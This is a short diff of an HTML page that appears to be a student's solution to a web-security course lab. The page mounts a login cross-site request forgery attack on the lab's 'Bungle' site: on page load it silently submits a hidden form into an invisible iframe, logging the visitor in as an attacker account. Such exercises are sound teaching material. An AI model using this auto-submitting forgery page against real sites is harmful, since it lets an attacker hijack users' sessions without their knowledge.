@@ -1,7 +1,7 @@
 <html>
-	<body hidden onload="document.forms[0].submit()">
+	<body hidden onload="document.getElementById('liform').submit()">
 		<iframe hidden name="invisframe" ></iframe>
-		<form action="http://bungle.cs.virginia.edu/login?csrfdefense=0&xssdefense=5" method="POST" target="invisframe">
+		<form id="liform" action="http://bungle.cs.virginia.edu/login?csrfdefense=0&xssdefense=5" method="POST" target="invisframe">
 			<input type="hidden" name="username" value="attacker" />
 			<input type="hidden" name="password" value="l33th4x" />
 			<input type="submit" style="display: none;" value="Login"/>
